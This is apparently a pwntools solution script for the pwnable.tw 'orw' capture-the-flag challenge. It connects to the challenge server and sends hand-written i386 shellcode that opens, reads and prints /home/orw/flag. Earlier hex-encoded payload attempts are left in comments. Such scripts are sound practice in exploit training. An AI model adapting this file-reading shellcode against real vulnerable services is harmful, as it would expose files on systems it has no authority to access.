from pwn import *


context.log_level = 'debug'
r = remote("chall.pwnable.tw", 10001)
#r = process('./orw')
#gdb.attach(r, api = True)

#payload = b"\x31\xC0\x31\xC9\x31\xD2\x83\xC0\x05\x83\xC1\x00\x81\xC2\xFF\x01\x00\x00\x31\xDB\x53\x68\x66\x6C\x61\x67\x68\x72\x77\x2F\x2F\x68\x65\x2F\x2F\x6F\x68\x2F\x68\x6F\x6D\x89\xE3\xCD\x80"
#payload = b"\x31\xC0\x31\xDB\x31\xC9\x83\xC0\x04\x83\xC3\x01\x89\xE1\xBA\x64\x00\x00\x00\xCD\x80"
payload = b"\x31\xC0\x31\xC9\x31\xD2\x83\xC0\x05\x83\xC1\x00\x81\xC2\x09\x03\x00\x00\x31\xDB\x53\x68\x66\x6C\x61\x67\x68\x72\x77\x2F\x2F\x68\x65\x2F\x2F\x6F\x68\x2F\x68\x6F\x6D\x89\xE3\xCD\x80\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x83\xC0\x03\x83\xC3\x01\x68\xA0\xAF\x04\x08\x59\x83\xC2\x64\xCD\x80\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x83\xC0\x04\x83\xC3\x01\x68\xA0\xAF\x04\x08\x59\x83\xC2\x64\xCD\x80"

shellcode = asm(
    '''
xor eax,eax
    xor ecx,ecx
    xor edx,edx
    add eax,0x5
    add ecx,0x0
    add edx,0x309
    xor ebx,ebx
    push ebx
    push 0x67616c66
    push 0x2f2f7772
    push 0x6f2f2f65
    push 0x6d6f682f
    mov ebx,esp
    int 0x80
    xor ebx, ebx
    add ebx, eax
    xor eax,eax
    xor ecx,ecx
    xor edx,edx
    add eax, 0x03
    mov ecx, esp
    add edx, 0x64
    int 0x80
    xor eax,eax
    xor ebx, ebx
    xor ecx,ecx
    xor edx,edx
    add eax, 4
    add ebx, 1
    mov ecx, esp
    add edx, 0x64
    int 0x80
    ''', arch='i386'
)

r.sendlineafter(b'shellcode:', shellcode)
r.interactive()